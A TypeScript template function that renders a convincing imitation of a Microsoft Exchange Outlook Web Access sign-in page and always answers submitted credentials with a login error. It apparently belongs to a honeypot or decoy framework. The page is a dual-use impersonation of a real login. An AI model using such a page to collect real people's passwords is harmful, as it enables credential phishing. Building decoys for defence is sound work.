import type { TemplateFn } from '../../types.js';

const css = `body{background:#0078d4;font-family:'Segoe UI',sans-serif;margin:0;}
.signin-container{max-width:440px;margin:6% auto;background:#fff;padding:44px;}
.signin-container h1{margin:0 0 24px;font-size:24px;font-weight:300;color:#1b1b1b;}
.form-field{margin-bottom:14px;}
.form-field input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #666;border-radius:0;box-sizing:border-box;}
.signin-btn{padding:8px 24px;background:#0078d4;color:#fff;border:0;font-size:14px;cursor:pointer;}
.error{color:#a80000;font-size:13px;margin-bottom:14px;}
`;

const headHtml = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Sign In</title>
<style>${css}</style>
</head>
<body>
<div class="signin-container">
<h1>Sign in</h1>`;

const formHtml = `<form action="/owa/auth.owa" method="post" name="logonForm">
<div class="form-field">
<input type="text" name="username" placeholder="someone@example.invalid" autocomplete="username">
</div>
<div class="form-field">
<input type="password" name="password" placeholder="Password" autocomplete="current-password">
</div>
<input type="hidden" name="flags" value="4">
<input type="hidden" name="forcedownlevel" value="0">
<input type="hidden" name="trusted" value="0">
<input type="hidden" name="destination" value="/owa/">
<button type="submit" class="signin-btn">Sign in</button>
</form>
</div>
</body>
</html>`;

const errorBlock = `<div class="error">The user name or password you entered isn't correct. Try entering it again.</div>`;

export const exchangeOwaLogin: TemplateFn = ({ request }) => {
  const error = request.method === 'POST' ? errorBlock : '';
  const html = `${headHtml}${error}${formHtml}`;
  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=UTF-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
    },
  });
};
